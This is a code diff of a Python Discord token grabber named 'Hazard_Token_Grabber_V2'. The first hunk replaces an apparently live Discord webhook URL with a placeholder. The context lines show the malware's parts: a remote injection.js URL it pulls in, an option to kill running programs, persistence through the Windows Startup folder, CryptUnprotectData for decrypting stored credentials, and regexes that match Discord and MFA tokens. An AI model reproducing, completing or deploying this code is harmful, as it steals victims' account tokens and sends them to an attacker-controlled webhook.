@@ -21,7 +21,7 @@ from win32crypt import CryptUnprotectData
 
 config = {
     # replace WEBHOOK_HERE with your webhook
-    'webhook': "https://discord.com/api/webhooks/972031131706859550/LpRMnEfA5hMPtlP75d8ESyKyQD7IAQCGJo9e3qsPTL35ckKyPN4OZc5QeDkhma71W24h",
+    'webhook': "WEBHOOK_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
@@ -117,7 +117,8 @@ class Hazard_Token_Grabber_V2(functions):
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.dir = mkdtemp()
-        self.startup_loc = self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+        self.startup_loc = self.roaming + \
+            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
